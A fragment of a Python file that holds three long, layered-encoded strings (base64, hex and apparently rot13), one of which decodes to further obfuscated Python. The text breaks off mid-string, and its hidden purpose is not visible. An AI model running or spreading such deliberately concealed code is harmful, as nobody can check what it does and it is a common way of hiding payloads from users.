import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDY1MzA2Yzc2MzQzMDcxMzYzNTY2MzcyYjY5NzI3NjRjNGI2ZTU0Njg2NzU5NTA2YjZjNzc2MTM2NDc2NzY3NmM0YjU0NDk2ZjY4NmQ1MTRmNmI2Yjc5Njk0ZTZhNGM1NDZjNmI1NzRhNDY0YjZkNzk3YTRmNDg1ODM5N2E2YzQyMzUzNzMxNTY0NDM0NTY2NTM5NjM0YTUxNmI2ZjcyNjg2ZDM0NjY3YTRiNTUzOTU2NjMzNzMxMzkyZjUwMzU3OTJiNGY2NjcyNzcyYjc4NzY3Njc4NjY1ODZlMzYyZjQ2NTAzMzJmMzc3MjYyNzI2NTZkNzY2NjU4MmI3YTM5MmYyZjJmNzY3NjMzNzczNTM3NzMzMzc1Nzg0MTMwNGUzNjc3NTg3NDY4NjI2MTMzMzE2YTJiMzczNDU3NzY1NjRlNjQ3NTcxNGY2ZDY2NTYzNDdhNzY2NjcyNGQ2Njc5Nzg0ZjQyMzMzMjYzMzM3OTJmNjI2NzM1NGE2NDc5Nzk3Mzc5MmI3YTQ4NzM2NjZlNDE3Njc1Mzc2NzM3NjM3ODY5NDU0OTJmNzk0MjM3MzU0ZTM0MmY2NjMxNjU0YzYyNTg3YTc0NWE2NTcwNzg2ZTJiNzQ3MDMwNjE0OTc5NzM3MjczMmY2YjM2NmE2MTc4MzE2ZDVhNmM3MTUwNGY0ZTU0NjQ2NTc1MzA0NzQ0NjU0ZjM2NzQ2NDU2NWE3NjRkNTQzNzJmNDg0ZDUwNTU2NDYyNzA1MjZkNjU3NTU0NTk3YTMxNzA1NTc5MzEyYjZlNTA2NDdhNTY3NTcyNTM3Nzc0NmE0YzU3NTgzNDU2NmU1YTYxMzg3NTMxMzE2OTUwMzI2NTMyNzI0NTUwNjU0ZjM2NTA0MjZmNzE2YTU5NjIzMTc1NDQ1Njc3NzYzNzQ2NGY1ODUzNGQ3NjY3MzU0ZjcxNjM0OTM2NTQ1NjM3NzczMzRiMzg0NjY2NGI2YjY1NTY3MTcyNmI2MTYzNjM2MjQ5NjUzMDQzMzM0NTMxNjY3MjMwNTQ1NjQyNDgzODM2NTQ3NTQ0NjQyZjU4N2E3NjY3NTkzMTUzN2E3NDU2NGY1OTQ3Nzk2Mzc5MzEzNTcxMmIyZjQxNTEyYjczNDQyYjc2NTM1MDM5MzY3ODRjMzU0YjQ0NTY2YzRhMzM2ZjJmNjc0ZjM4NDQzNzM0MzY2YTUwNGM3NjU3Mzk3MDMzNTg2YzY3NmE2MTM4NjQ3YTRiNzM3OTU5NjEzMTQ2MzI0NTY0MzE2YzY2NjI0OTUzMmY0YTMyMzk1YTU3NDQ3NTM0NWE0ZDdhNzQ0Yzc0N2E1MDc3Njk1ODRkMzEzMzYxNTA2ZDdhMmI0YTJiNDI2NjZkNGE1NTYzNzY0ZTYzNjk0NTZhMzg0MTc5MzU3MTQ4NDkzNzc3N2E3NDcyNmI3ODYyNTk3MDMwNDI2ZTRkNTYyYjU4NWE3OTRlNGM2YzYyNDU2NTM1NjI2ODRhNzM1MjM3NmU3MTUyNGM3Mjc5Mzg2YTQ5NTUzOTQyNTI1MjUyNjI2YjUwNjE2ODRiNTk2ZTMxMzg3NzZhNzI0OTQzNWEzOTM3NDYyZjU0Nzk1ODRmNjk2NzU2NDQ2YTc2NjE0ZjUzNGY0MTcwMzM2Nzc0MzQ3YTRjNGU1NzUzNmU1MzQxNjY1ODZjNjQ0MTQ0Mzk1YTc4NzU0OTYxNzM0OTJmNDczODQ4MzA0NTRmMzUzOTZlNzc1MDRmNzY2NzRkNTA3MzQ3NzY2YzZkNzQ2ODY3MzIyYjYzNTEzNTZiNjQ2ZjUzMzgzODM4MzIyZjRkNTI3MzZmMmY0YTdhMmI1MTQ0MzgzNDQyNzY1OTU3Mzk3NzYyNmQ2NzQ2MzM1Mjc1MzUzOTUzNDgzMzcwMzg0YjQzMmI2NjYyNmI0MTc2NmYzMzUxMzY3NzQ0NjQ0MjQ0NzUzNTQxNTczOTUxNzkzNjYzNDU2MjUyNTk2NDM4MzQzMjU5NzU0NTU4NGI0ZDVhMzk1OTM0Mzc2MzQxNjIzMDUyMmYzNzU0NDQ0ODU5NDM2NTYxNjQ0ODMyNjg0ODZjNDE0ODc2NDQ2NjUzNTA3MzYyNjk1NDY0NGM3MzM0NDQ2ZTUxMzczMTZmNDE2MjUzNDM3YTZkNDQ1ODc4NjYzMjM5Nzg1MDMyNmE2Njc1NjQ0MzUwNjQ3MjJiMzY3MDc3NzIzNzQ4NTczOTZlMzAzMDc0NjQzNDY0MzY2NzU4NmU2YzM5NDI3YTUzNjY2ZDM0NzQ2YTM0NmU0MjU4MmYzNDZmMzkzMTQzMzczNzQxMzc0MTU0NmU3NDUxNDc2NTQ3NjUyZjUwNGMzMjZlNDg0MjYyMzM3YTUyMmY2YTQ4NzUzMzczNDUzMzM3NmY0NTY0NTE3MTM5NzIyYjZiNTc1YTc3NTYzNzY3NTgzODM0NTIyYjcxNTU1MDUzNGQ2NzcwNTA2ZjRlMmI3MjRiNTAzOTc1Mzc1MjJmNzk0ODZjNGM2NTYzMzU3MDc0MzE3MTY2MzA0ZTU3NDcyZjczNjczMTU0NmI0MjM3Nzg0ODRkMzgyYjU1NGY2MTZlMzc1NjYzNzQ1MjMwNjU0NDY1MzI1MDU3NGIzOTc0NzM0ZDUzNjU0NTY2NzgzNjM4NGUyYjU1MmY2OTdhNzc2ZTc2MzU3NzRlNjk2ODY2MzY2Nzc2MmI2MzRmNDUzOTMwNDc1NjQ4NTg2YTY0NzA0ZTZmNGUyYjUxNDQzOTczNjU2YTdhNjk1ODRlNDM0YzM4Mzc0OTUyNjU2ZjU1MmY3MTVhNDg1MDUwNDI2NTc4NmY0YjRjMmY1MjcwNTM2MjUwNjQ2ZTcyNjQ3NDUyMzY0MjM5MmIzNDZlMzM0NTQ0NGY2ZjQ2Mzk3MDMyNjQ1NDMwNTkzNTRjNzI0NTZkNGM2ZTZlNGM2NDM4NDUzNzQ5NTA2NTY1MmI0ZTQ5NGIyZjMwMzU2MzRjNTczOTQ2NGY2MTQ1MmYzMDcyMzE0NzUxNzI2ZjQ4MzI3MjU3NGU0MzQzNzI3NDRkNTk2MzM4NGYyZjUzNGI0NzMzNDM0ODc2NGU0MzM3NzA0MjM3NDM1NDY2NzUzMzQxNjI2OTQyMzMzMjY4NjYzODQ4NTc2NTQzNzg3MDQ4MzM3NzY0MzU1NDYxNDU3YTdhNjcyZjYzMzQ1MTM5NzM3MDM3NDI2Yjc5NzQ2MjUxNGU1MTJiNjQ3MjM2NDE0ODc4NjE1NzUzMzg1NTc5NmUzODQzNjY0YzUzNjM2MzY4Nzg3NDVhMzM2YTRjNGQ2MTMzNjc1ODYxNzA2NjYxNmQ2OTQ4NjM0Yjc2NjM0YTYzNjk2ZTJiNTc1YTY0NmI0NTJmMzQ1NDZiN2E1NDYxMmI1NDdhNjE2OTY2NjQ1NTZjMzU1MzM5NDI1Njc3NGE1OTZhNjczMzRiNmQ0ODU3MzM2ZjRlMzY2ZDRjNGYzNzY0N2E3Njc2MmY2YzRhMzU0MTRhMzkzMDQ4NjU2YTQ0NTg2MTMzNzE2NzU4NjY0YTM5NTQ0ODM3NDE2YTM2NDEzMzM3NDc0NDYzNjc2MjJiNjc1MjM2Nzk3MjYxNGY1MDU5MzU2YTQ1NjY3Nzc1MzU1NDc4NmE3NTY0NzU0ZTU4MzM2NzQ4MmY1MjY3NTQ1NTU4NjQzNTY5NjY1OTQ0Mzk1OTcyNGM1OTRmNGQzODYyNDQzNjM4NzIyZjMwNDQ0YzM2NmY1MDJmNjc1MTM2NTg0MzRmMzAzMzZkNTE1ODM4MzczNDU2MmY0NTM4MzY0YjM4NDM2ZTM0NzczNzZhNGQ2YjZjMmI0YjQ4NjY0ZjQ5Nzc1MDZjNDQ0ODZmNGI3MTU1MmI2NTJmNDk0ODc5NDE3MDJiNzU3MTQ3NGY0NzQ3NjQ2ZjcyMzc1MzQyNTU2NDczMmYyZjU3NGY2ZDM0MzczMjZkNmMzMzRhNDQ1MDQ5NDkzOTMwNzkzNjVhNTI3OTY3NTg0ZTYzNTc2NDZlNmUzNjZmMzczNDUzNjU3MTQ4Mzg3NDUyMzQ2NjJiNTI0YzM5Njc1ODRlNDQ3OTVhNzgzNDYxNzQ1YTMzNjk2NjU1NWEyZjM4Njg1NDZmNzgzNzZiNjUzNjY0MzE3MDJiNzc2NTY2NmE0NjJiMzA1MjM4NzE2NjVhNzczNTcyNDg1MTM5MzU0ODc1NTE3OTZiNjcyZjM5N2E0MjY4NDEyYjc1NDgzMzUyMmI1OTVhMzA0Mjc3Nzg3YTM1NDg0ODUxNjM2NTYyNjk2ZTZlNzk2YzM1MzA2ODU4NmE2YTUzNmY3MjM5NTM3YTY4NzYzNjQ2N2EzNTdhMzI3MjUwNDQ2MzMzNGE3NDU4MzE3MDJmNmY0MTJiNzk0MTQ4Mzg3NTM1NjQzMTcyNzU2YzUwNmY1NzYzNjM0MjUwNzU3NTM0NjI0NjRmNTA0ZjY1NGUzMjY5NTg2ODU4NDk2ZDM5MzU0Yzc0MmI0Mjc2NzkzMzM4NmIzMzQ1NjUyZjMzNjE2OTc1NTkzNjcyMzk0ODUwNzE2YjJmNDk2MTQzMzg2MjYyNDc1ODMwNGE2NDY3NGUzOTQ4NTI2ZDcyNjE1ODUwNzc0YTM5NzE2YzdhNjg3NTMwNjMzOTY5NGM2YTZmMmIzMDM5MzU2ZDU3NGUyZjMwNDk2NDRmNjI1NTQyMmIzMjQxNGQ2NDQ4NGMzNjRjNTA0ZDU2MzE1MDYzNGMzNTZiNjY0NTQ1NjM1MjZlNzk0NjUwMzU3MTM5Nzg3MTY4MmI2ZjQ4Mzk3NzRjNTAzODc4MzA1ODRkMzI2ZDJiNGI0Yzc0Njk3NjM2NDU2NjRkMzkzOTdhNGUyYjZhMmI2ZDU2NzYzNTZiNTQyZjc0NzQ2NjJiNTI3NjJmNTczNjM3NTkzOTY2NTE0ODc5NDIzMTJiNTM2MzU4Mzk0NzY2MzQ0OTM4NWE2YzcyNGY3YTQxNzY2NzU5MzgzMjM0NzE3NjRlNTI3ODUwNjczMzM2NzY2YTQ0MmY2NjcyMzc0YzY1MzM0ZDZmNDQzNjMwNjY3YTQ5MmI2MTQ0MzA2NzdhMzU2NjZiNjgyZjRiNjc1MDcwNmQ0ODM0N2E1MDZiNWEzMjJiNmQ3NTQ0MzI3OTY2NzM0NDMzNzM0MTUwNzMzODU2NmE3NjMwNDQzODU5NzM3ODY4NmU0NzU5Mzg2ZjM5N2E1MDM0Njc3ODM4MzUzNTQyMzk3ODczNTc0YTM4Nzk1YTZjMzM0NDY0NWE1MjcwNDM0ZDYyNmI1NzY0NDc3ODc0NjY2OTc5MmYzODUyNzYzNzU1NzQ0ZDU5Mzg3Nzc2NmQ0MTJmMzg2ODJmNzYzMTU4NDg2ZjM2NzkzOTZhMmY0YzQzNTk0ODM3Njc1O'
trinity =  'QLmAGx2ZwZlAzR3AwEzZmNmAmDlA2R2MQDlZmt1LGLkAmt3ZGMwAmD3ZwWvAmZ1BGZ3AGx0MQDmZzVmAwEvAmN3AwMxAQx2AGH5AmLmZwDlAGDmBQIuAzZ1ZwLlAzZ3BQHjZzV0BGD5Zmp1AmpjAQDlMwH4AmLmAwEwAmZ3ZGDlAwZ1AmD1ZzV3BGIuAQt3ZwZ5ATL2AGL3ZmDlLwHjAQx3AwD1ZmZlMwIuATD3AmH0AmV0AmExAmZmZwL4ATZlLwp5AQV2AGWvAmNmZQZ4AGt2LGEwAwZ2MGZlAwtmZmZjAwV2LmDlZzLmBQDmZzV2ZmWzAmx3ZmWvAwp1AQZ0AwDmAGZ0Zmp3AmHkZmLmAwMuAQt0BQH3Zmt3ZQLmZmD0AmZ3AzZlLwH0AQt3AQH5AmD0LwL1AmxmBQZ1ATZ2LwZ2ZzL2LmExAQt0BQH3AmH3AwMuAQD0LGD1AQt3AQEyAmtmZmEzAQHmAGquATV3Awp1AJR0AQL2Amp0LGH0Amt2AwZ2AQVmBGH0AmL0AGLkZmtmZQMyAmp3BGp2Zmx0MQp1A2R3AwDmAQD2BGH2ZmDmZGZ2AwZ2ZGLkZmt3ZQD0AGH1ZQMuZmp2LmquZmD0ZwHlAmx3AQDlZmR2MGpkAwR0BQExAGH2LGLlAQR2AGD5AQxmAwp3AQD2LwH5AwH1ZGL4AQt1AQWvAmt0AwZmAQp1ZGZ1ZzV0MQExAmt0MGH1AmN3LGpmZmV2MQp1AzL2ZwWvATV3BQL4ZmZ0Mwp0AJR0Zwp5ATD0MQZ0AQDmZmH0AGRmAmpjAQL2MGZ4Amx2LmWzATD0ZGIuAGV0BQZ1AwR0MwquZmV1AGp4ZmN1BGEyZmD0ZwH4Zmx2AmL2AwZ0MwZ0ZmR0Mwp1ZmL0LwLkAGt2AwHlAmZ3BGZmAQt2Awp4ZmxmZGD0AzDmZwquATZmAmZ5Zmx2MGD1ZmpmZGLkAwH1ZQDkAwLmZmDkZmpmBGWzATD3AwExAzL3ZwH1AwRmZmEyAGV2ZGH0AmH0BGpmAmV3AQZmAQt0MGpmAmL0AQEyA2R2ZwquZzL2MQMwAGp1ZQMvAGt1AmL5ATRmAwpmATH1BGHlAQp0AGMwAGV3ZmL0AGR1BQH3ZmL0LGLmAGp2AGEwAmx0ZwZkAQL0AwHlAmRmAGZ1ZmHlMwquATD1AQH0AQZ3ZwplAQL0AGD3Awt3AGL5ZmVmA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'
oracle = 'I3NjM2NjE0ZTQ0NzIzMjVhNTU1MTc0NTc2MTMzNzk1NzM2NjYyYjdhNTg3OTc3NjczNjQ3MzY0MzM4Mzc1MTU4MzU0ODRlNDU0YTRmNmU1MzQzMzY2ZDZmN2E0OTY5NzM1MDc1NzQ2NTY4MzA0MjM4MzU3NTU0NTUzODQyNjM0YzM1NDg0ZTQ4NDc3Mjc1N2E1MzM5NmUyYjY3Njg1NTY1Njk0YjM2NGI0MjQ3NDE1NTY4MmY3MTUzNjM0NzU4MzkzMDc2NzU2OTY3Njk1MTJiNmEyYjMyNjMzMDUyNjM1MzcwMzY2YTVhNGI1MjU0NmU2MjZhNmE2YjU5MzU1MTQzMmY2ZjQ5NmQ3MjZkMmY0MzUxNzE3MTRmNmM2MzM2MzczMTQ1NDQzNDZlNzk2MjYzNDUyZjQ1NjQzNzRkMzE0YjY4MzY1MzcxNzQ2ODU2MzgzMzc1NzkyZjMxNDM3MzU4NmIyZjMwNTc2NTU4MzM1ODMyNzA1NTU0N2E2NDM5NTczNDcwNmMzNzZlNzU1Mjc2NDc3MzcwNzg3MzZhNzUzMzJiNGE2Njc4NTAzOTU2NjU2YTUzMzI0NjQ1NTQ2MjYzMmI0OTZkNzQ2OTYxNmE2YzQ2NmY2NjY1NmE0ZjU0NjE0ZDU1Nzg3NzZjNzQ0OTU3NmYyZjQyNzU3OTQzN2E2MTZiNmE0YTRiMzA1NDRmNzE1NDU5N2E2MTQ5NjU0OTQxNzA0MzJiNjU2Nzc1NDgzMTMwNjgzMDU3NTA2ZjY3MzEzMDZhMzA1YTMwNzYyYjU3NzY2YjY2NTk2MjMzNTI3MzYxNzU3MzdhNzc1NDQ4NWE3NjM0NmY1NjM2NGE2MTUwNDI3Mzc5NDM0ZDZhNTc3MjRlMzM3MjUxNmQ3NDc3NjY2ZDU1NzIzNjY2NTI2MjZiNzU2YTRiNzczNjM3NjE1NDMzNDY0OTUzNzA3NTYxNDI1NDRkMzQ1NDcwMzAzODM1NWE3Mjc3N2EzNDc1Mzc0ZjQ5MzM2ZDZmMzk2ZjUxNmUzOTQ3MzY2ZjM4NmYzNTY0NDg1NTMwNzcyYjczMzMzNjUxNjE2ZDU0NDkzMDcxNmI2NjZiNzk2NjZiMzE3MDY0NDY2NDcyN2EzMjY4Njg3OTM2MzczNjQ0NGYzNzY1NzM2ODRjNmY3Nzc1NGI1NTM1MzM3OTcyNDY0NzRiNDM1MTQ1NmI0ZjcwNDE1MjJmNjU2YTM1NmU2ZDY5Mzc3NDY3NzM0ODMzNjI0MjQ0MmIzNjQ3NjQ0ODY2NDUzOTc1MzIzNjU4MmI3OTJiNjE2NjcxNDk2ZTM1NTg2MTUzMzEzMzZhNmQ1NjQxNjQzNjUwNDU1MDRmNmI0OTY2NDg2MTUyNGE1MjU0NGI0YjQyMzA0YjY0NDc3MzdhNjc2NDU1NDU1MTRjNWE2YjUzMzczOTRjMzA3MDU1NTE2NzY5N2E0OTRjNTQ2YzU5NDY1NDRiNDM0YzYxNTI0NzMzMzEzOTRkNTE2ODJiNmM3MzUxNTg2MTYyMzkzOTMwNTEzNzc0NDQzMTc3NzE2YjU1MzA0NDcyNjE1NTcwNTU1NDc0Njk2MTU5NTM2ZTY0MzY2MTQ3Njg1ODc5Njk0NjcwNzgzNjcyNGQ0NjMzNjI0NDQ2Njk3NTY2NTM2MjZhNTQ3MTYxNzU3NTcwNTI0ZDcwNzA2Yjc5NTM3MTc5NDUyZjYxNTA2NTM1MzM2OTY2Nzk1YTMyNDczOTcwNTY0YTZhNmY1NzUyNmM3MDY4NDM3NjU0MzY0MzM3NmM3OTY1NmI0MTU1NTE2OTY5NzEzOTUxNzA2ZTZmNmQ3MTYxMzU1MzQ5MzA3YTUzNGU3NjZiMzUzNjY4NGQzNjdhNDY0ODRiNDczMzUzNmEzOTUzNjQ1MTU0NjUyZjVhNDU3MTU5NjgyYjQ4NjU2YjUwNDg2NjYzNzIyYjcwNDM2NTMzNjg1NjQ1NTM0NDY3Mzk0ZDM3NTEzODc0NGUzODUzNGE1MzRiNjE2ZTZlNDczNjZmNjY2ZTU4MzY0YTRlNDQyZjJmNmM0MzY4NTU2NTY5NjI3MDRhMzI1OTRmNjc0YTQzMmI2ZTQ3NmUzNzU5NjY2ODMxNGQ1MzJiNjc3NDUyNGY0OTMzNzk2ZDRhNTA2NjYzNDEzMzM5NTEzMjZiMzA1ODM5NzU1NjZmMzE0NjU4NmY2ZjQzNjM0NTZmNDE2NjMyNDE0ODZmN2E2MjY5NzU3MDQ0MzA3NzRjNzA3NzRlNmE2NjQ5MzU1MjRjNmQ0OTU4NDc3NDJiNTQzMDUxMzc0ZTU3NzA1MDJmNTc3MjM1NmI2MTM5NDE3MjM5NGQ2ZjQ2NjU1Mzc3NmU3NDQxNmM2MzMwNGE2YTY5NTE0MjRlMzAzODRiNjMzOTRiNTk2MTQyNWE3ODUwMmY2ODY3NTI1NjY1NjQzMDQ1MmY3MjRkNzQ1MDM1Njc0MTM1Nzg0YjQ1NjYzMzJiNTE2ODJmNzA1MDMxNzM2NDQ3Mzk1NzQ1NjQ3NjQ2NWE2ZjMyMzUzNjY5NmM2ZDUyNjY3MTRhNzM2ZDU0NmQ2ODMyNDk3YTU0NTA0MTY2NzY1MjMwMzc3NjcxNDI2NjUzNTE0NzUxNzY3MzcyMmYzODZlNTU2OTc2NzA2MTYzMmI0ODc2NmQ2YTU4MzI3MzM5N2E0YzZiNGYzODcxNDUyYjM3NDM2YzY1NWEzNTc3Nzk0NDZhNmYzMjU1N2EzOTM2NGI3MDY2NTI2YTZlNDgyYjY0NzA3YTRmNDkyZjJiNGQ0NjMwNTM3NjM5NDE1MzQ2NDUzMDRhNGY0Yjc3NjI3NDZhMzk3MTY2NDc1MTJiN2E3NTYyMzY1ODJiNzQ1YTU0NGE0NDU4NDY2OTVhNGE2ZjUwNjE2NTRiNmU0MzRhNzY0NTY2MmY3NzUzNjU1MzYxNTUzMDMwMzk0MjY0NjE1NDU4MzAzNjRlNGY2NDQ1NjI3MDdhNjk2ODJmNTk1Njc4NmM0ZjY3NTczMTZkNTU1NDRmNmI3ODY1NjE0MTYzNTczNTU1NDIzNTYyNTM2NTM1Mzc3NDMxNTI2ZjM5MmI3NzUwNjY1NjZjNzI3YTcyNGY2MTRhNTM0ZTY1NzQ1YTU0MzI3Nzc0N2E0MjY1Nzk2OTZkMmY0OTRkNzAzMDQyMzY2ZDZhMzE0ZDU1N2EzNDM5NDQ1NzU5NjU1MTQ4N2E2NzRlNDE2NjUwNmU2YjVhNjQ2OTUxMzY2MjRmNzQyYjZjNTgzOTRmNjg1NTZiMzg0ODQ5NTEzOTRmMzI1NTY3NDg0YTdhNmEzMDJmNzkyZjU1NmM1MDM2NTczNjZkNmQ0ZDM5NjcyZjQ3Mzg1NTdhN2E1MTU4NzY0MTUzNzU1MTJmMzI1MDc0MzU3MzZkMzgzMTYxNzY1MzYzNTUyYjYyNzE2MTJiNzE2OTcwN2E3NTYzNGM0ZDczNGE3ODY0NjQzNTY5Mzg2NzMxMzk1NTQyMzA2ZTRlNGQ0NzMwNmUzODQ1MmY3ODZmNjQ3MDcwNzk0ODc0NWEzNjcxNGQ0MzM1MmIyYjUxNTg3YTQzNmM0NjQyNTA2MjU4NTk1NDYxNjkyYjJmNmMzNjZhNzQzNjYyNGY2NDMxNzEyZjMxNDQyZjczNjk2NjZkNjE1MzQ4NDQ0NjJiNDU0NDJmNjQ3ODQ3NjY0ZTUwNmY0YTY2NTI0NzUyMzU2YzUyMzg3OTMyNmU2YjcxNGU0NjcxNmU2NTY2MzAzOTQ5NjgzNTQzNDg2YjY5NGQ2YTZkNTYzMTRlNGU0YzQ4NjEyZjcwNTQzODdhNTQ0NTY2NmU1MjY1NTI3YTMyNGUzNj